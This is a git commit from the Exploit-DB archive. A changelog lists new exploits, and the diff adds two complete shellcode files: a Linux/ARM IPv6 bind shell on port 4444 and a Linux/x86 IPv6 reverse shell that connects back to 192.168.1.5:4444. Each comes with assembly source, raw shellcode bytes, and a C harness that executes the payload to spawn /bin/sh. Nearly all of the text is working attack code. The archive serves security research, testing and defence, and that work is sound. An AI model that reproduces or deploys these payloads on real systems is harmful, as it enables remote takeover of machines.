3aca47020d7d94187887d6273029abdb12f02d4f
Offensive Security <info@exploit-db.com>
2018-08-04 05:01:46 +0000

    DB: 2018-08-04
    10 changes to exploits/shellcodes
    
    FTPShell Client 5.24 - Add to Favorites Buffer Overflow
    FTPShell Client 5.24 - 'Add to Favorites' Buffer Overflow
    
    FTPShell Client 5.24 - Create NewFolder Local Buffer Overflow
    FTPShell Client 5.24 - 'Create NewFolder' Local Buffer Overflow
    Wedding Slideshow Studio 1.36 - Buffer Overflow
    Linux Kernel - UDP Fragmentation Offset 'UFO' Privilege Escalation (Metasploit)
    
    Chartered Accountant : Auditor Website 2.0.1 - Cross-Site Scripting
    Auditor Website 2.0.1 - Cross-Site Scripting
    Basic B2B Script 2.0.0 - Cross-Site Scripting
    Entrepreneur Job Portal Script 3.0.1 - Cross-Site Scripting
    PHP Template Store Script 3.0.6 - Cross-Site Scripting
    Vuze Bittorrent Client 5.7.6.0 - SSDP Processing XML External Entity Injection
    Plex Media Server 1.13.2.5154 - SSDP Processing XML External Entity Injection
    cgit < 1.2.1 - 'cgit_clone_objects()' Directory Traversal
    
    Linux/x86 - Reverse TCP (::FFFF:192.168.1.5:4444/TCP) Shell (/bin/sh) + Null-Free + IPv6 Shellcode (86 bytes)
    Linux/ARM - Bind (4444/TCP) Shell (/bin/sh) + IPv6 Shellcode (128 Bytes)

---
+++ shellcodes/arm/45144.c
@@ -0,0 +1,137 @@
+/*
+Title:  Linux/ARM - IPv6 4444/TCP Bind Shellcode (128 Bytes)
+Date:   2018-07-25
+Tested: armv7l (Raspberry Pi 3 Model B+)
+Author: Ken Kitahara
+
+pi@raspberrypi:~ $ uname -a
+Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
+pi@raspberrypi:~ $ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Raspbian
+Description:	Raspbian GNU/Linux 9.4 (stretch)
+Release:	9.4
+Codename:	stretch
+pi@raspberrypi:~ $ cat bindshell-ipv6.s 
+.section .text
+.global _start
+
+_start:
+    .ARM
+    add  r3, pc, #1
+    bx   r3
+
+    .THUMB
+    // socket(AF_INET6, SOCK_STREAM, IPPROTO_IP)
+    mov  r0, #10
+    mov  r1, #1
+    eor  r2, r2, r2
+    mov  r7, #100
+    add  r7, r7, #181
+    svc  #1
+    // save fd
+    mov  r4, r0
+
+    // bind(fd, &sockaddr, 28)
+    adr  r1, struct_addr
+    // replace 0xff with NULL and set sin6_family to 0x0a (AF_INET6)
+    strb r2, [r1, #1]
+    // replace 1 with NULL and set sin6_flowinfo to NULL
+    str  r2, [r1, #4]
+    // replace 1 with NULL and set sin6_addr to ::
+    str  r2, [r1, #8]
+    str  r2, [r1, #12]
+    str  r2, [r1, #16]
+    str  r2, [r1, #20]
+    // replace 1 with NULL and set sin6_scope_id to NULL
+    str  r2, [r1, #24]
+    mov  r2, #28
+    add  r7, r7, #1
+    svc  #1
+
+    // listen(host_sockid, 2)
+    mov  r0, r4
+    mov  r1, #2
+    add  r7, r7, #2
+    svc  #1
+
+    // accept(host_sockid, 0, 0)
+    mov  r0, r4
+    eor  r1, r1, r1
+    eor  r2, r2, r2
+    add  r7, r7, #1
+    svc  #1
+    // save fd
+    mov  r4, r0
+
+    // dup2(client_sockid, 0)
+    mov  r7, #63
+    svc  #1
+
+    // dup2(client_sockid, 1)
+    mov  r0, r4
+    add  r1, r1, #1
+    svc  #1
+
+    // dup2(client_sockid, 2)
+    mov  r0, r4
+    add  r1, r1, #1
+    svc  #1
+
+    // execve("/bin/sh", 0, 0)
+    eor  r1, r1, r1
+    eor  r2, r2, r2
+    adr  r0, spawn
+    strb r2, [r0, #7]
+    mov  r7, #11
+    svc  #1
+
+spawn:
+.ascii "/bin/shA"
+
+struct_addr:
+.ascii "\x0a\xff" // sin6_family -> AF_INET6
+.ascii "\x11\x5c" // sin6_port -> 4444
+.byte  1,1,1,1    // sin6_flowinfo -> NULL
+.byte  1,1,1,1    // sin6_addr -> ::
+.byte  1,1,1,1
+.byte  1,1,1,1
+.byte  1,1,1,1
+.byte  1,1,1,1    // sin6_scope_id -> NULL
+
+pi@raspberrypi:~ $ as -o bindshell-ipv6.o bindshell-ipv6.s && ld -N -o bindshell-ipv6 bindshell-ipv6.o
+pi@raspberrypi:~ $ objcopy -O binary bindshell-ipv6 bindshell-ipv6.bin
+pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' bindshell-ipv6.bin
+\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x0a\x20\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x04\x1c\x13\xa1\x4a\x70\x4a\x60\x8a\x60\xca\x60\x0a\x61\x4a\x61\x8a\x61\x1c\x22\x01\x37\x01\xdf\x20\x1c\x02\x21\x02\x37\x01\xdf\x20\x1c\x49\x40\x52\x40\x01\x37\x01\xdf\x04\x1c\x3f\x27\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x49\x40\x52\x40\x01\xa0\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41\x0a\xff\x11\x5c\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01
+
+*/
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char sc[] = \
+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
+"\x0a\x20\x01\x21\x52\x40\x64\x27"
+"\xb5\x37\x01\xdf\x04\x1c\x13\xa1"
+"\x4a\x70\x4a\x60\x8a\x60\xca\x60"
+"\x0a\x61\x4a\x61\x8a\x61\x1c\x22"
+"\x01\x37\x01\xdf\x20\x1c\x02\x21"
+"\x02\x37\x01\xdf\x20\x1c\x49\x40"
+"\x52\x40\x01\x37\x01\xdf\x04\x1c"
+"\x3f\x27\x01\xdf\x20\x1c\x01\x31"
+"\x01\xdf\x20\x1c\x01\x31\x01\xdf"
+"\x49\x40\x52\x40\x01\xa0\xc2\x71"
+"\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
+"\x2f\x73\x68\x41\x0a\xff\x11\x5c"
+"\x01\x01\x01\x01\x01\x01\x01\x01"
+"\x01\x01\x01\x01\x01\x01\x01\x01"
+"\x01\x01\x01\x01\x01\x01\x01\x01";
+
+void main()
+{
+    printf("Shellcode Length: %d\n", strlen(sc));
+
+    int (*ret)() = (int(*)())sc;
+
+    ret();
+}
---
+++ shellcodes/linux_x86/45139.c
@@ -0,0 +1,107 @@
+# Title: Linux/x86 - Reverse TCP shell (IPv6) + Null Free
+# Shellcode Author: Kartik Durg
+# Shellcode Length: 86 BYTES
+# Student-ID: SLAE-1233
+# Note ~
+https://iamroot.blog/2018/07/29/0x2-shell_reverse_tcp_ipv6-linux-x86/
+# Description: Connect-back to IPV6 socket listening on IP
+::FFFF:192.168.1.5 and port 4444.
+
+/*
+
+global _start
+section .text
+
+;References:
+;(1)http://syscalls.kernelgrok.com/
+;(2)https://www.3dbrew.org/wiki/Socket_Services
+;(3)
+https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_71/rzab6/cafinet6.htm
+
+_start:
+;IPV6 socket creation
+;int socketcall(int call, unsigned long *args);
+;sockfd = socket(int socket_family, int socket_type, int protocol);
+push byte 0x66        ;socketcall()
+pop eax                    ;EAX=0x2
+
+xor ebx,ebx              ;zero out ebx
+
+push 0x6                  ; IPPROTO_TCP=6
+push 0x1                  ; socket_type=SOCK_STREAM (0x1)
+push 0xa                  ; AF_INET6
+inc ebx                     ; Define SYS_socket = 1
+mov ecx,esp            ; save pointer (ESP) to socket() args (ECX)
+int 0x80
+xchg esi,eax            ; sockfd stored in esi
+xor eax,eax
+
+;Connect
+;connect(sockfd, (struct sockaddr*)&srvaddr, sizeof(srvaddr));
+;int socketcall(int call, unsigned long *args);
+push DWORD eax                 ;sin6_scope_id
+push DWORD 0x0501a8c0   ;MY LOCAL IP = 192.168.1.5 | Can be configured to
+YOUR's
+push word 0xffff
+push DWORD eax
+push DWORD eax
+push WORD ax        ;inet_pton(AF_INET6, "::ffff:192.168.1.5",
+&srvaddr.sin6_addr)
+push DWORD eax                  ;sin6_flowinfo
+push WORD 0x5c11               ;sin6_port=4444 | 0x5c11 | Configurable |
+push WORD 0x0a                   ;AF_INET6
+mov ecx,esp                            ;ECX holds pointer to struct
+sockaddr_in6
+push byte 0x1c                        ;sizeof(sockaddr_in6) | sockaddr_in6
+= 28
+push ecx                                  ;pointer to sockfd
+push esi                                   ;sockfd
+mov ecx,esp                            ;ECX points to args
+inc ebx
+inc ebx                                      ;EBX = 0x3 | #define
+SYS_Connect 3
+push byte 0x66                         ;socketcall()
+pop eax
+int 80h
+
+push byte 0x2                           ;push 0x2 on stack
+pop ecx                                     ;ECX = 2
+
+;dup2() to redirect stdin(0), stdout(1) and stderr(2)
+loop:
+push byte 0x3f        ;dup2()
+pop eax                   ;EAX = 0x3f
+int 0x80                   ;exec sys_dup2
+dec ecx                    ;decrement counter
+jns loop                    ;if SF not set ==> keep on jumping
+
+;execve(/bin//sh)
+xor ecx,ecx               ;clear ECX
+push ecx                   ;Push NULL
+push byte 0x0b         ;execve() sys call number
+pop eax                     ;EAX=0x2 | execve()
+push 0x68732f2f       ;(1)/bin//sh
+push 0x6e69622f      ;(2)/bin//sh
+mov ebx,esp             ;EBX pointing to “/bin//sh”
+int 0x80                     ;Calling Interrupt for sys call
+
+*/
+
+/*
+gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -m32
+
+./shellcode
+
+*/
+
+#include<stdio.h>
+
+unsigned char shellcode[] = \
+"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x68\xc0\xa8\x01\x05\x66\x6a\xff\x50\x50\x66\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+
+main()
+{
+printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
+int (*ret)() = (int(*)())shellcode;
+ret();
+}
